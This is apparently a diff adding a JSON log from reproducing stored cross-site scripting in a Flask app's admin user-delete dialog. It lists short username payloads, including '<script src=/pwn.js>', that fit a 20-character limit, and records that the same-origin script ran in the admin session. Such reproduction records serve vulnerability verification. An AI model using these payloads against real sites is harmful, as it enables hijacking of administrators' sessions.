@@ -1,0 +1,87 @@
+{
+  "reproduced": "yes",
+  "note": "A username of 20 characters or fewer ran a script in the admin session when the delete dialog opened. Length(max=20) rejects <svg onload=alert(1)> (21). <svg onload=alert()> is parsed into the Bootbox body; this Chromium build does not run that onload because jQuery assigns the string with innerHTML.",
+  "registrations": {
+    "longExample": {
+      "username": "<svg onload=alert(1)>",
+      "length": 21,
+      "status": 200,
+      "location": null,
+      "stored": false,
+      "errors": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Register</title>\n    <script type=\"text/javascript\" src=\"/static/node_modules/jquery/dist/jquery.js\"></script><script type=\"text/javascript\" src=\"/static/node_modules/jquery-pjax/jquery.pjax.js\"></script><script type=\"text/javascript\" src=\"/stati"
+    },
+    "svg": {
+      "username": "<svg onload=alert()>",
+      "length": 20,
+      "status": 200,
+      "location": null,
+      "stored": true,
+      "errors": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Register</title>\n    <script type=\"text/javascript\" src=\"/static/node_modules/jquery/dist/jquery.js\"></script><script type=\"text/javascript\" src=\"/static/node_modules/jquery-pjax/jquery.pjax.js\"></script><script type=\"text/javascript\" src=\"/stati"
+    },
+    "script": {
+      "username": "<script src=//127.1>",
+      "length": 20,
+      "status": 200,
+      "location": null,
+      "stored": true,
+      "errors": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Register</title>\n    <script type=\"text/javascript\" src=\"/static/node_modules/jquery/dist/jquery.js\"></script><script type=\"text/javascript\" src=\"/static/node_modules/jquery-pjax/jquery.pjax.js\"></script><script type=\"text/javascript\" src=\"/stati"
+    },
+    "sameOrigin": {
+      "username": "<script src=/pwn.js>",
+      "length": 20,
+      "status": 200,
+      "location": null,
+      "stored": true,
+      "errors": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Register</title>\n    <script type=\"text/javascript\" src=\"/static/node_modules/jquery/dist/jquery.js\"></script><script type=\"text/javascript\" src=\"/static/node_modules/jquery-pjax/jquery.pjax.js\"></script><script type=\"text/javascript\" src=\"/stati"
+    }
+  },
+  "listProbe": {
+    "jquery": "function",
+    "bootbox": "object",
+    "rows": [
+      {
+        "text": "<script src=//127.1> script-user@example.test 9 minutes ago 127.0.0.1",
+        "dialogue": "Are you sure you want to delete <script src=//127.1>?"
+      },
+      {
+        "text": "<script src=/pwn.js> pwn-user@example.test 2 minutes ago 127.0.0.1",
+        "dialogue": "Are you sure you want to delete <script src=/pwn.js>?"
+      },
+      {
+        "text": "<svg onload=alert()> svg-user@example.test 9 minutes ago 127.0.0.1",
+        "dialogue": "Are you sure you want to delete <svg onload=alert()>?"
+      },
+      {
+        "text": "admin admin@example.com 20 minutes ago 198.50.184.159",
+        "dialogue": "Are you sure you want to delete admin?"
+      },
+      {
+        "text": "zmassey ballardjessica@little.org 20 minutes ago 168.105.232.255",
+        "dialogue": "Are you sure you want to delete zmassey?"
+      }
+    ]
+  },
+  "svgClick": {
+    "newDialogs": [],
+    "pwned": null,
+    "bootboxHtml": "Are you sure you want to delete <svg onload=\"alert()\">?</svg>",
+    "requests": []
+  },
+  "scriptClick": {
+    "newDialogs": [],
+    "pwned": null,
+    "bootboxHtml": "Are you sure you want to delete <script src=\"//127.1\">?</script>",
+    "requests": [
+      "http://127.0.0.1/"
+    ]
+  },
+  "sameOriginClick": {
+    "newDialogs": [],
+    "pwned": "flaskbones",
+    "bootboxHtml": "Are you sure you want to delete <script src=\"/pwn.js\">?</script>",
+    "requests": [
+      "http://127.0.0.1:5000/pwn.js"
+    ]
+  },
+  "dialogs": []
+}
